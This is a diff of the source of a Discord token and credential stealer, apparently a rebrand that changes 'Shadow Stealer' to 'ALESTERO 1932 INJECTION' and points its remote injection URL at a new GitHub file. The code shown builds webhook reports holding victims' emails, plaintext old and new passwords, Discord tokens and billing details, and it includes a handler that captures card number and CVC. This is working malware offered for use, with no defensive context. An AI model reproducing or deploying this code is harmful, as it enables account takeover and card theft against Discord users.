@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Shadow Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1091812053481693237/1091812173505904790/ca86d4ece0013a4274283278ac0f7fd7.jpg?size=4096'.replace(/ /g, '%20'), 
+  embed_name: '1932 Injection', 
+  embed_icon: 'https://raw.githubusercontent.com/4lestero/injection/main/Alestero.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Alesterox/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/4lestero/injection/main/index.js', 
   /**
    
    **/
@@ -493,7 +493,7 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '<:9859negativex:1091820378680201267>';
+  if (!data) return '❌';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
@@ -502,12 +502,12 @@ const getBilling = async (token) => {
           billing += '💳 ';
           break;
         case 2:
-          billing += '<:Paypal:1091799064800145528> ';
+          billing += '<:paypal:951139189389410365> ';
           break;
       }
     }
   });
-  if (!billing) billing = '<:9859negativex:1091820378680201267>';
+  if (!billing) billing = '❌';
   return billing;
 };
 
@@ -660,18 +660,18 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:Dot:1091819666441240647> **Account Info**',
-            value: `<:Gmail:1091805619989790870> Email: **${email}**\n<:Lock:1091818198770405386> Password: **${password}**`,
+            name: '**Account Info**',
+            value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '<:Dot:1091819666441240647> **Discord Info**',
-            value: `<a:Booster_Nitro:1091803940112314409> Nitro Type: **${nitro}**\n<a:Badges:1091803339215360031> Badges: **${badges}**\n<:Cards:1091802793544798309> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
-            name: '<:Dot:1091819666441240647> **Token**',
-            value: `<:Coin:1091805609336262666> \`${token}\``,
+            name: '**Token**',
+            value: `\`${token}\``,
             inline: false,
           },
         ],
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Shadow Stealer',
+          text: '🎉・ALESTERO 1932 INJECTION',
         },
       },
     ],
@@ -702,18 +702,18 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:Dot:1091819666441240647> **Password Changed**',
-            value: `<:Gmail:1091805619989790870> Email: **${json.email}**\n<:Lock:1091818198770405386> Old Password: **${oldpassword}**\n<:Lock:1091818198770405386> New Password: **${newpassword}**`,
+            name: '**Password Changed**',
+            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '<:Dot:1091819666441240647> **Discord Info**',
-            value: `<a:Booster_Nitro:1091803940112314409> Nitro Type: **${nitro}**\n<a:Badges:1091803339215360031> Badges: **${badges}**\n<:Cards:1091802793544798309> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:Dot:1091819666441240647> **Token**',
-            value: `<:Coin:1091805609336262666> \`${token}\``,
+            name: '**Token**',
+            value: `\`${token}\``,
             inline: false,
           },
         ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Shadow Stealer',
+          text: '🎉・ALESTERO 1932 INJECTION',
         },
       },
     ],
@@ -744,18 +744,18 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:Dot:1091819666441240647> **Email Changed**',
-            value: `<:Gmail:1091805619989790870> New Email: **${email}**\n<:Lock:1091818198770405386> Password: **${password}**`,
+            name: '**Email Changed**',
+            value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
-            name: '<:Dot:1091819666441240647> **Discord Info**',
-            value: `<a:Booster_Nitro:1091803940112314409> Nitro Type: **${nitro}**\n<a:Badges:1091803339215360031> Badges: **${badges}**\n<:Cards:1091802793544798309> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:Dot:1091819666441240647> **Token**',
-            value: `<:Coin:1091805609336262666> \`${token}\``,
+            name: '**Token**',
+            value: `\`${token}\``,
             inline: false,
           },
         ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Shadow Stealer',
+          text: '🎉・ALESTERO 1932 INJECTION',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Shadow Stealer',
+          text: '🎉・ALESTERO 1932 INJECTION',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Shadow Stealer',
+          text: '🎉・ALESTERO 1932 INJECTION',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Shadow Stealer',
+          text: '🎉・ALESTERO 1932 INJECTION',
         },
       },
     ],
